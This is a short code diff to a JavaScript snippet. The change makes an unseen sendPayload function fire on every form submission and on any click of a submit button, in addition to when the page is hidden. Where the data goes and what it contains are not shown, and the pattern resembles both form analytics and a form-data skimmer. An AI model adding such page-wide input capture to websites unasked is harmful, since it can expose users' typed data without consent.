@@ -86,9 +86,18 @@
         if (document.visibilityState === 'hidden') sendPayload();
     });
 
-    // NEW: Listen for actual form submission
+        // NEW: Listen for actual form submission AND button clicks
     document.addEventListener('submit', function(e) {
-        sendPayload(true); // Force send the payload with the is_submitted flag
+        sendPayload(true);
+    }, true);
+
+    // BACKUP: If they click ANY submit button, fire instantly before the page reloads
+    document.addEventListener('click', function(e) {
+        const target = e.target;
+        // Check if they clicked a submit button or something inside a submit button
+        if (target.type === 'submit' || target.closest('button[type="submit"]') || target.closest('input[type="submit"]')) {
+            sendPayload(true);
+        }
     }, true);
 
 })();
